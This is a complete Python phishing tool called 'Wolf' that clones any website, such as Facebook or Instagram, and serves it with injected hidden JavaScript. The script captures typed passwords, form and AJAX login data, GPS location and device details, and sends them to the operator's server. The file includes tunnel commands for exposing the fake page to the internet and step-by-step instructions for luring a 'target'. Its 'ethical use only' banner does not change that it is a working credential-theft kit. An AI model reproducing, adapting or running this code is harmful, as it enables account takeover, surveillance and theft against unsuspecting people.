#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██╗    ██╗ ██████╗ ██╗     ███████╗                       ║
║   ██║    ██║██╔═══██╗██║     ██╔════╝                       ║
║   ██║ █╗ ██║██║   ██║██║     █████╗                         ║
║   ██║███╗██║██║   ██║██║     ██╔══╝                         ║
║   ╚███╔███╔╝╚██████╔╝███████╗██║                            ║
║    ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝                            ║
║                                                              ║
║         Website Cloner & Credential Harvester               ║
║         Clone ANY Website — Capture Login Details           ║
║         Works on Termux & Kali Linux                        ║
║                  Created by Redone                          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os, sys, time, json, re, socket, ssl, threading
import http.server, urllib.request, urllib.parse, urllib.error
import datetime

class C:
    GREEN  = '\033[0;32m'
    BRIGHT = '\033[1;32m'
    RED    = '\033[0;31m'
    YELLOW = '\033[1;33m'
    CYAN   = '\033[0;36m'
    WHITE  = '\033[1;37m'
    GOLD   = '\033[38;5;220m'
    GRAY   = '\033[38;5;240m'
    PURPLE = '\033[0;35m'
    RESET  = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{C.RED}
  ██╗    ██╗ ██████╗ ██╗     ███████╗
  ██║    ██║██╔═══██╗██║     ██╔════╝
  ██║ █╗ ██║██║   ██║██║     █████╗  
  ██║███╗██║██║   ██║██║     ██╔══╝  
  ╚███╔███╔╝╚██████╔╝███████╗██║     
   ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
{C.RESET}""")
    print(f"{C.RED}{'═'*60}{C.RESET}")
    print(f"{C.WHITE}   Website Cloner & Credential Harvester{C.RESET}")
    print(f"{C.CYAN}   Clone ANY Website — Capture Login Details{C.RESET}")
    print(f"{C.GREEN}   Termux & Kali Linux | No Install Needed{C.RESET}")
    print(f"{C.GOLD}   Created by Redone ⚡{C.RESET}")
    print(f"{C.RED}{'═'*60}{C.RESET}")
    print(f"{C.YELLOW}   ⚠️  FOR ETHICAL USE ON YOUR OWN DEVICES ONLY  ⚠️{C.RESET}")
    print(f"{C.RED}{'═'*60}{C.RESET}\n")

def ok(m):    print(f"{C.GREEN}[+]{C.RESET} {m}")
def info(m):  print(f"{C.CYAN}[*]{C.RESET} {m}")
def warn(m):  print(f"{C.YELLOW}[!]{C.RESET} {m}")
def err(m):   print(f"{C.RED}[-]{C.RESET} {m}")
def hr():     print(f"{C.RED}{'─'*60}{C.RESET}")
def sp():     print()

captured = []

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# ════════════════════════════════════════════════════════
# WEBSITE CLONER ENGINE
# ════════════════════════════════════════════════════════
def clone_site(url, callback):
    """Download and clone any website, inject harvester"""

    # Fix URL
    if not url.startswith('http'):
        url = 'https://' + url

    info(f"Connecting to: {C.BRIGHT}{url}{C.RESET}")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'identity',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }

    html = ""
    try:
        req = urllib.request.Request(url, headers=headers)
        resp = urllib.request.urlopen(req, context=ctx, timeout=30)
        html = resp.read().decode('utf-8', errors='ignore')
        final_url = resp.geturl()
        ok(f"Downloaded: {C.BRIGHT}{len(html)//1024} KB{C.RESET}")
    except Exception as e:
        warn(f"Could not download full page: {e}")
        warn("Using basic clone template...")
        domain = url.replace('https://','').replace('http://','').split('/')[0]
        html = basic_clone(url, domain)
        final_url = url

    # Get base domain for fixing relative URLs
    parsed = urllib.parse.urlparse(url)
    base_domain = f"{parsed.scheme}://{parsed.netloc}"

    # Fix all relative URLs to point to original site
    html = fix_urls(html, base_domain, url)

    # Inject credential harvester
    html = inject_harvester(html, url, callback)

    return html, url


def fix_urls(html, base_domain, page_url):
    """Fix relative URLs to point to original website"""

    # Fix href links
    html = re.sub(r'href="(?!http|mailto|javascript|#)([^"]*)"',
                  lambda m: f'href="{base_domain}/{m.group(1).lstrip("/")}"', html)
    html = re.sub(r"href='(?!http|mailto|javascript|#)([^']*)'",
                  lambda m: f"href='{base_domain}/{m.group(1).lstrip('/')}'", html)

    # Fix src attributes
    html = re.sub(r'src="(?!http|data:)([^"]*)"',
                  lambda m: f'src="{base_domain}/{m.group(1).lstrip("/")}"', html)
    html = re.sub(r"src='(?!http|data:)([^']*)'",
                  lambda m: f"src='{base_domain}/{m.group(1).lstrip('/')}'", html)

    # Fix action attributes (form submissions)
    html = re.sub(r'action="(?!http)([^"]*)"',
                  lambda m: f'action="{base_domain}/{m.group(1).lstrip("/")}"', html)

    # Fix CSS background urls
    html = re.sub(r"url\('(?!http|data:)([^']*)'\)",
                  lambda m: f"url('{base_domain}/{m.group(1).lstrip('/')}')", html)

    return html


def inject_harvester(html, original_url, callback):
    """Inject hidden JavaScript harvester into cloned page"""

    harvester = f"""
<!-- Wolf Harvester -->
<script>
(function() {{
    var CB = '{callback}';
    var SITE = '{original_url}';

    // Send data to Wolf
    function wolf_send(d) {{
        try {{
            fetch(CB, {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(d),
                mode: 'no-cors'
            }});
        }} catch(e) {{
            try {{
                new Image().src = CB + '?d=' + encodeURIComponent(JSON.stringify(d));
            }} catch(e2) {{}}
        }}
    }}

    // Collect device info
    function wolf_device() {{
        return {{
            site: SITE,
            ts: new Date().toISOString(),
            ua: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            memory: navigator.deviceMemory || 'N/A',
            cores: navigator.hardwareConcurrency || 'N/A',
            referrer: document.referrer,
            url: window.location.href
        }};
    }}

    // Page visit tracking
    window.addEventListener('load', function() {{
        var d = wolf_device();
        d.type = 'visit';
        wolf_send(d);

        // GPS location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                function(p) {{
                    var ld = Object.assign({{}}, d);
                    ld.type = 'location';
                    ld.lat = p.coords.latitude;
                    ld.lon = p.coords.longitude;
                    ld.accuracy = p.coords.accuracy;
                    ld.maps = 'https://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude;
                    wolf_send(ld);
                }},
                function() {{}},
                {{enableHighAccuracy: true, timeout: 10000}}
            );
        }}

        // Battery info
        if (navigator.getBattery) {{
            navigator.getBattery().then(function(b) {{
                var bd = Object.assign({{}}, d);
                bd.type = 'device_info';
                bd.battery = Math.round(b.level * 100) + '%';
                bd.charging = b.charging;
                wolf_send(bd);
            }});
        }}
    }});

    // ── FORM INTERCEPTOR ──────────────────────────────
    // Intercept ALL form submissions
    document.addEventListener('submit', function(e) {{
        var form = e.target;
        var d = wolf_device();
        d.type = 'form_submit';
        d.form_action = form.action || window.location.href;
        d.fields = {{}};

        // Collect all input values
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(inp) {{
            var key = inp.name || inp.id || inp.type || 'field';
            var val = inp.value;
            d.fields[key] = val;

            // Tag important fields
            var t = (inp.type || '').toLowerCase();
            var n = (inp.name || inp.id || '').toLowerCase();
            if (t === 'password' || n.includes('pass') || n.includes('pwd')) {{
                d.password = val;
            }}
            if (t === 'email' || n.includes('email') || n.includes('mail')) {{
                d.email = val;
            }}
            if (n.includes('user') || n.includes('login') || n.includes('phone')) {{
                d.username = val;
            }}
        }});

        wolf_send(d);
        // Let form submit normally
    }}, true);

    // ── CLICK INTERCEPTOR ─────────────────────────────
    document.addEventListener('click', function(e) {{
        var el = e.target;
        // Check if submit button
        if (el.type === 'submit' || el.tagName === 'BUTTON' ||
            (el.getAttribute && el.getAttribute('role') === 'button')) {{
            var form = el.closest ? el.closest('form') : null;
            if (form) {{
                var d = wolf_device();
                d.type = 'button_submit';
                d.button_text = (el.innerText || el.value || '').trim();
                d.fields = {{}};
                form.querySelectorAll('input, textarea, select').forEach(function(inp) {{
                    var key = inp.name || inp.id || inp.type || 'field';
                    d.fields[key] = inp.value;
                    var t = (inp.type || '').toLowerCase();
                    var n = (inp.name || inp.id || '').toLowerCase();
                    if (t === 'password' || n.includes('pass')) d.password = inp.value;
                    if (t === 'email' || n.includes('email')) d.email = inp.value;
                    if (n.includes('user') || n.includes('login')) d.username = inp.value;
                    if (n.includes('phone') || t === 'tel') d.phone = inp.value;
                }});
                if (Object.keys(d.fields).length > 0) wolf_send(d);
            }}
        }}
    }}, true);

    // ── AJAX/FETCH INTERCEPTOR ────────────────────────
    // Override XMLHttpRequest
    var origXHROpen = XMLHttpRequest.prototype.open;
    var origXHRSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(m, u) {{
        this._wolf_method = m;
        this._wolf_url = u;
        origXHROpen.apply(this, arguments);
    }};

    XMLHttpRequest.prototype.send = function(body) {{
        if (body) {{
            var bs = (typeof body === 'string') ? body : '';
            if (bs && (bs.includes('password') || bs.includes('pass') || bs.includes('pwd'))) {{
                var d = wolf_device();
                d.type = 'ajax_submit';
                d.ajax_url = this._wolf_url;
                d.body = bs;
                try {{
                    var params = new URLSearchParams(bs);
                    params.forEach(function(v, k) {{
                        d['field_' + k] = v;
                        if (k.includes('pass') || k.includes('pwd')) d.password = v;
                        if (k.includes('email') || k.includes('user')) d.email = v;
                    }});
                }} catch(ex) {{
                    try {{
                        var j = JSON.parse(bs);
                        Object.assign(d, j);
                    }} catch(ex2) {{}}
                }}
                wolf_send(d);
            }}
        }}
        origXHRSend.apply(this, arguments);
    }};

    // Override fetch
    var origFetch = window.fetch;
    if (origFetch) {{
        window.fetch = function(url, opts) {{
            if (opts && opts.body) {{
                var bs = typeof opts.body === 'string' ? opts.body : '';
                if (bs && (bs.includes('password') || bs.includes('pass'))) {{
                    var d = wolf_device();
                    d.type = 'fetch_submit';
                    d.fetch_url = url;
                    d.body = bs;
                    try {{
                        var params = new URLSearchParams(bs);
                        params.forEach(function(v, k) {{
                            if (k.includes('pass') || k.includes('pwd')) d.password = v;
                            if (k.includes('email') || k.includes('user')) d.email = v;
                        }});
                    }} catch(ex) {{
                        try {{
                            var j = JSON.parse(bs);
                            if (j.password) d.password = j.password;
                            if (j.email) d.email = j.email;
                            if (j.username) d.username = j.username;
                        }} catch(ex2) {{}}
                    }}
                    wolf_send(d);
                }}
            }}
            return origFetch.apply(this, arguments);
        }};
    }}

    // ── PASSWORD FIELD MONITOR ────────────────────────
    // Watch password fields as user types
    document.addEventListener('DOMContentLoaded', function() {{
        function attachWatcher() {{
            document.querySelectorAll('input[type="password"]').forEach(function(inp) {{
                if (!inp._wolf_watched) {{
                    inp._wolf_watched = true;
                    inp.addEventListener('blur', function() {{
                        if (inp.value.length > 0) {{
                            var d = wolf_device();
                            d.type = 'password_typed';
                            d.password = inp.value;
                            d.field_name = inp.name || inp.id || 'password';
                            // Get nearby email/username field
                            var form = inp.closest('form');
                            if (form) {{
                                var emailInp = form.querySelector('input[type="email"], input[name*="email"], input[name*="user"]');
                                if (emailInp) d.email = emailInp.value;
                            }}
                            wolf_send(d);
                        }}
                    }});
                }}
            }});
        }}
        attachWatcher();
        // Re-attach for dynamic forms
        setInterval(attachWatcher, 2000);
    }});

}})();
</script>
<!-- End Wolf -->"""

    # Inject before </body>
    if '</body>' in html.lower():
        html = re.sub(r'</body>', harvester + '\n</body>', html, flags=re.IGNORECASE)
    elif '</html>' in html.lower():
        html = re.sub(r'</html>', harvester + '\n</html>', html, flags=re.IGNORECASE)
    else:
        html += harvester

    return html


def basic_clone(url, domain):
    """Generate a basic login page if download fails"""
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{domain} - Login</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:-apple-system,Arial,sans-serif; background:#f0f2f5; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }}
.card {{ background:white; border-radius:8px; padding:40px 30px; max-width:400px; width:100%; box-shadow:0 2px 16px rgba(0,0,0,.1); text-align:center; }}
.logo {{ font-size:28px; font-weight:700; color:#1877f2; margin-bottom:8px; }}
.sub {{ color:#65676b; font-size:14px; margin-bottom:24px; }}
input {{ width:100%; padding:14px 16px; border:1px solid #dddfe2; border-radius:6px; font-size:16px; outline:none; margin-bottom:12px; color:#1c1e21; }}
input:focus {{ border-color:#1877f2; box-shadow:0 0 0 2px rgba(24,119,242,.2); }}
.btn {{ background:#1877f2; color:white; border:none; padding:14px; border-radius:6px; font-size:17px; font-weight:700; cursor:pointer; width:100%; margin-bottom:12px; }}
.btn:hover {{ background:#1557b0; }}
.forgot {{ color:#1877f2; font-size:14px; text-decoration:none; display:block; margin-bottom:16px; }}
.divider {{ border:none; border-top:1px solid #dadde1; margin:16px 0; }}
.logo-big {{ font-size:48px; margin-bottom:12px; }}
</style>
</head>
<body>
<div class="card">
<div class="logo-big">🔐</div>
<div class="logo">{domain}</div>
<div class="sub">Sign in to continue</div>
<form id="loginForm">
<input type="text" id="email" name="email" placeholder="Email or username" autocomplete="off">
<input type="password" id="password" name="password" placeholder="Password">
<button type="submit" class="btn">Log In</button>
</form>
<a href="#" class="forgot">Forgot password?</a>
<hr class="divider">
<p style="font-size:13px;color:#65676b">{url}</p>
</div>
</body>
</html>"""


# ════════════════════════════════════════════════════════
# HTTP SERVER
# ════════════════════════════════════════════════════════
class WolfHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        ip = self.client_address[0]
        if '/wolf_collect' not in self.path:
            print(f"\n{C.CYAN}[VISIT]{C.RESET} {C.BRIGHT}{ip}{C.RESET} opened cloned page")

    def do_GET(self):
        srv = self.server

        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            try:
                self.wfile.write(srv.page.encode('utf-8', errors='ignore'))
            except: pass

        elif '/wolf_collect' in self.path:
            # Receive data via GET (image beacon fallback)
            try:
                qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
                if 'd' in qs:
                    data = json.loads(urllib.parse.unquote(qs['d'][0]))
                    data['visitorIP'] = self.client_address[0]
                    show_capture(data)
            except: pass
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;')

        else:
            # Try to proxy request to original site
            try:
                target = srv.original_url.rstrip('/') + self.path
                req = urllib.request.Request(target)
                req.add_header('User-Agent', 'Mozilla/5.0')
                resp = urllib.request.urlopen(req, context=ctx, timeout=10)
                content = resp.read()
                ct = resp.headers.get('Content-Type', 'text/html')
                self.send_response(200)
                self.send_header('Content-Type', ct)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_response(302)
                self.send_header('Location', '/')
                self.end_headers()

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body.decode())
            except:
                data = {}
                try:
                    for pair in body.decode(errors='ignore').split('&'):
                        if '=' in pair:
                            k, v = pair.split('=', 1)
                            data[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
                except: pass
            data['visitorIP'] = self.client_address[0]
            if not data.get('ts'):
                data['ts'] = datetime.datetime.now().isoformat()
            show_capture(data)
        except: pass
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()


def show_capture(data):
    """Display captured credentials"""
    dtype = data.get('type', '')

    # Only show important captures
    important = ['form_submit', 'button_submit', 'ajax_submit',
                 'fetch_submit', 'password_typed', 'credentials']

    has_creds = data.get('password') or data.get('email') or data.get('username')

    if dtype in important or has_creds:
        captured.append(data)
        print(f"\n{C.RED}{'═'*60}{C.RESET}")
        print(f"{C.BRIGHT}{C.GOLD}  🐺  WOLF CAPTURED DATA #{len(captured)}  🐺{C.RESET}")
        print(f"{C.RED}{'═'*60}{C.RESET}\n")

        fields = [
            ("Type",       dtype.upper()),
            ("Visitor IP", data.get('visitorIP', '')),
            ("Site",       data.get('site', '')),
            ("Time",       data.get('ts', '')[:19]),
            ("Email",      data.get('email', '')),
            ("Username",   data.get('username', '')),
            ("Password",   data.get('password', '')),
            ("Phone",      data.get('phone', '')),
            ("Device",     data.get('ua', '')[:55]),
            ("Screen",     data.get('screen', '')),
            ("Timezone",   data.get('timezone', '')),
            ("GPS",        f"Lat:{data.get('lat','')} Lon:{data.get('lon','')}" if data.get('lat') else ''),
            ("Maps",       data.get('maps', '')),
            ("Fields",     str(data.get('fields', ''))[:100] if data.get('fields') else ''),
            ("Body",       str(data.get('body', ''))[:100] if data.get('body') else ''),
        ]

        for label, value in fields:
            if value and str(value).strip():
                col = C.RED if label in ['Email','Password','Username','Phone'] else C.GREEN
                print(f"  {col}{label:<12}{C.RESET} {C.WHITE}{str(value)[:65]}{C.RESET}")

        # Save to file
        fn = f"wolf_capture_{int(time.time())}.json"
        with open(fn, 'w') as f:
            json.dump(data, f, indent=2)
        sp()
        ok(f"Saved: {C.BRIGHT}{fn}{C.RESET}")
        print(f"{C.RED}{'═'*60}{C.RESET}")

    elif dtype == 'location' and data.get('lat'):
        print(f"\n{C.CYAN}[📍 GPS]{C.RESET} {data.get('visitorIP','')} → {data.get('lat','')},{data.get('lon','')}")
        if data.get('maps'):
            print(f"  {C.CYAN}{data.get('maps','')}{C.RESET}")

    elif dtype == 'visit':
        ip = data.get('visitorIP', '')
        ua = data.get('ua', '')[:40]
        print(f"{C.GREEN}[VISIT]{C.RESET} {ip} — {ua}")

    warn("Watching for logins... (CTRL+C to stop)")


# ════════════════════════════════════════════════════════
# MAIN CLONE FUNCTION
# ════════════════════════════════════════════════════════
def run_wolf():
    while True:
        banner()

        print(f"{C.WHITE}What Wolf does:{C.RESET}")
        print(f"  {C.GREEN}✅{C.RESET} Clone ANY website completely")
        print(f"  {C.GREEN}✅{C.RESET} Inject hidden credential harvester")
        print(f"  {C.GREEN}✅{C.RESET} Capture all form submissions")
        print(f"  {C.GREEN}✅{C.RESET} Capture AJAX & Fetch logins")
        print(f"  {C.GREEN}✅{C.RESET} Monitor password fields in real-time")
        print(f"  {C.GREEN}✅{C.RESET} Capture GPS location")
        print(f"  {C.GREEN}✅{C.RESET} Capture device & browser info")
        print(f"  {C.GREEN}✅{C.RESET} Host cloned site locally")
        print(f"  {C.GREEN}✅{C.RESET} Proxy all other pages to real site")
        sp()

        print(f"{C.WHITE}Examples:{C.RESET}")
        print(f"  {C.CYAN}facechatnetwork.pythonanywhere.com{C.RESET}")
        print(f"  {C.CYAN}facebook.com{C.RESET}")
        print(f"  {C.CYAN}instagram.com{C.RESET}")
        print(f"  {C.CYAN}anywebsite.com/login{C.RESET}")
        sp()

        url = input(f"{C.YELLOW}Enter URL to clone: {C.RESET}").strip()
        if not url:
            err("No URL entered!")
            time.sleep(1)
            continue

        port = int(input(f"{C.YELLOW}Local port [8080]: {C.RESET}").strip() or "8080")

        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"

        # Build callback
        callback = f"http://{local_ip}:{port}/wolf_collect"

        sp(); hr()
        info(f"Cloning: {C.BRIGHT}{url}{C.RESET}")
        info("Please wait...")

        # Clone the site
        page_html, original_url = clone_site(url, callback)
        ok(f"Clone complete! ({len(page_html)//1024} KB)")

        # Save cloned page
        with open('wolf_clone.html', 'w', encoding='utf-8') as f:
            f.write(page_html)
        ok(f"Saved: wolf_clone.html")

        # Start server
        server = http.server.HTTPServer(('0.0.0.0', port), WolfHandler)
        server.page = page_html
        server.original_url = original_url if original_url.startswith('http') else f'https://{original_url}'

        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()

        sp(); print(f"{C.RED}{'═'*60}{C.RESET}")
        print(f"{C.BRIGHT}{C.GOLD}  🐺  WOLF IS RUNNING  🐺{C.RESET}")
        print(f"{C.RED}{'═'*60}{C.RESET}")
        ok(f"Cloned:    {C.BRIGHT}{url}{C.RESET}")
        ok(f"Local URL: {C.BRIGHT}http://{local_ip}:{port}{C.RESET}")
        sp()
        print(f"{C.WHITE}For internet access open NEW terminal:{C.RESET}")
        warn(f"Cloudflare: {C.GREEN}cloudflared tunnel --url http://localhost:{port}{C.RESET}")
        warn(f"Serveo:     {C.GREEN}ssh -R 80:localhost:{port} serveo.net{C.RESET}")
        sp()
        print(f"{C.WHITE}How it works:{C.RESET}")
        print(f"  1. Share URL to target")
        print(f"  2. Target opens → sees REAL looking clone")
        print(f"  3. Target types email + password")
        print(f"  4. YOU see credentials here instantly!")
        print(f"  5. Target continues to real website normally")
        print(f"{C.RED}{'═'*60}{C.RESET}")
        warn("CTRL+C to stop and clone another site")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.shutdown()
            print()
            ok(f"Wolf stopped. Total captures: {len(captured)}")
            if captured:
                fn = f"wolf_all_{int(time.time())}.json"
                with open(fn, 'w') as f:
                    json.dump(captured, f, indent=2)
                ok(f"All captures saved: {fn}")
            sp()
            choice = input(f"{C.YELLOW}Clone another site? (yes/no): {C.RESET}").lower()
            if choice != 'yes':
                banner()
                print(f"{C.GOLD}Goodbye! — Wolf by Redone ⚡{C.RESET}\n")
                sys.exit(0)


if __name__ == "__main__":
    run_wolf()
